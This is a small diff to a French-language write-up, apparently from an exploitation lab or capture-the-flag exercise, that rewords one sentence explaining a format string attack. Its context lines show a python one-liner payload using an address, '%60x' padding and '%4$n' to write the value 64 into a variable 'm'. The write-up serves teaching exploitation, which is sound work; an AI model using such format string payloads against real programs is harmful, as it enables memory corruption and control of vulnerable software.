@@ -70,7 +70,7 @@ Nous allons donc créer le script suivant :
 ```
 python -c 'print("\x8c\x98\x04\x08" + "%60x" + "%4$n")' > /tmp/exploit
 ```
-Qui va écrire a la 4e stackFrame, 64(adresse(4) + caracteres(60)) a l'adresse de "m".
+Qui va écrire au 4e de la stackFrame, 64(adresse(4) + caracteres(60)) a l'adresse de "m".
 
 En partant du dernier script, il suffit de mettre nos 60 espaces "%60x", et de donner l'adresse de m a %n pour écrire 64 dedans (0x40 en hexa)
 
